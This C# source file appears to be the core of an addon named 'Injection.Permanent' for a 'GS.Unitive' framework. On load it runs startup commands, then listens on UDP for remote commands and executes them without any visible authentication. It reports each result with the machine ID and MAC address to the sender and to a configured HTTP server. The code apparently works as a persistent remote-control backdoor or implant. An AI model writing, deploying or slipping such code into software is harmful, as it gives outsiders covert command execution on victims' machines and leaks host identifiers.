using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GS.Unitive.Framework.Core;
using Newtonsoft.Json;
using System.Net;


namespace Cirno.ChinaGS.Injection.Permanent
{
    public class Program : IAddonActivator
    {
        public static IAddonContext AddonContext;
        public static CommandFactory Factory;
        public static UdpTransmissionManager UdpManager;
        public static HttpTransmissionManager HttpManager;
        public static AddonConfig Config;

        public void Start(IAddonContext context)
        {
            try
            {
                AddonContext = context;
                Config = new AddonConfig();

                Factory = new CommandFactory();

                int errorCode = 0;
                Factory.ExecuteUpdate();
                Factory.ComposeCommandAssembly();
                Factory.ExecuteStartupCommand(ref errorCode);

                HttpManager = new HttpTransmissionManager();

                UdpManager = new UdpTransmissionManager(Config.LocalUdpPort);
                UdpManager.OnUdpTransmissionReceived += Program_OnUdpTransmissionReceived;
                UdpManager.StartListenAsync();
            }
            catch (Exception ex)
            {
                if (AddonContext != null)
                {
                    WriteLog("Exception encountered while loading CGSIv3!", ex);
                }
            }
        }

        public void Stop(IAddonContext context)
        {
            UdpManager.Dispose();
        }

        public void Program_OnUdpTransmissionReceived(object sender, UdpTransmissionEventArgs e)
        {
            WriteLog("Received remote command! " + e.Message);

            CommandProtocolVersion protocol = CommandProtocolVersion.Unknown;
            RemoteCommandGeneric command = Utils.ParseCommand(e, ref protocol);

            if (!(protocol == CommandProtocolVersion.Unknown))
            {
                bool hasError = false;
                int errorCode = 0;
                string result = Factory.ExecuteCommand(command, ref errorCode);
                WriteLog("Command executed! Result: " + result);

                try
                {
                    UdpManager.Send(JsonConvert.SerializeObject(new Result
                    {
                        machine_id = Utils.GetMachineID(),
                        machine_ip = Utils.GetMachineMacAddr(),
                        msg = result,
                        errcode = errorCode,
                        time = DateTime.Now.ToString()
                    }), 
                    (IPEndPoint)e.RemoteEP, Config.RemoteUdpPort);
                    WriteLog("Udp datagram sent!");
                }
                catch (Exception ex)
                {
                    WriteLog("Fail to send udp datagram to remote endpoint!", ex);
                }

                HttpManager.Post(Config.RemoteHttpConfig.ApiResultFeedback, 
                JsonConvert.SerializeObject(new Result
                {
                    machine_id = Utils.GetMachineID(),
                    machine_ip = Utils.GetMachineMacAddr(),
                    msg = result,
                    errcode = errorCode,
                    time = DateTime.Now.ToString()
                }), 
                ref hasError);

                if (hasError)
                {
                    WriteLog("Failed to send HTTP request to designated server!");
                }
                else
                {
                    WriteLog("HTTP request sent!");
                }
            }
            else
            {
                WriteLog("Unknown command protocol version!");
            }
        }

        public static void WriteLog(string msg, Exception exception = null)
        {
            try
            {
                if (Config.Debugging)
                {
                    AddonContext.Logger.Info(msg, exception);
                }
            }
            catch
            {

            }
        }
    }
}
